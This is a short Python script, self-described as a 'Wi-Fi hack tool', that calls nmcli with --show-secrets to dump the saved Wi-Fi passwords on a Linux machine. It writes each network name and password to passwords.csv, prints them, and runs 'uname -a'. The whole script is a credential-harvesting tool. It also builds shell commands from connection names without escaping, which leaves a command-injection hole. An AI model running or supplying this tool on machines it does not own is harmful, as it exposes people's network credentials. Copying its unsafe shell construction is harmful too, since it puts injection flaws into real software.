import os
import csv

out = os.popen("nmcli connection show").read()
out_mas = out.split("\n")[1:-1]

names = [e.split()[0] for e in out_mas if
         e.split()[3] == "wifi" or e.split()[2] == "wifi"]

print(f"\033[94mWi-Fi hack tool by prok0l and ArtSharaev\033[94m")
print()
for wifi_name in names:
    wifi_password = "None"
    out = os.popen(
        f"nmcli --show-secrets connection show \"{wifi_name}\"").read()
    for line in out.split("\n"):
        if "wireless-security.psk:" in line:
            wifi_password = line.split()[1]
    with open("passwords.csv", mode="a", encoding="utf-8") as writing_file:
        file_writer = csv.writer(writing_file, delimiter=";")
        file_writer.writerow([wifi_name, wifi_password])
    p = " " * (40 - len(wifi_name))
    print(f"\033[92m{wifi_name}\x1b[m{p}\033[91m{wifi_password}\x1b[m")

os.system("uname -a")
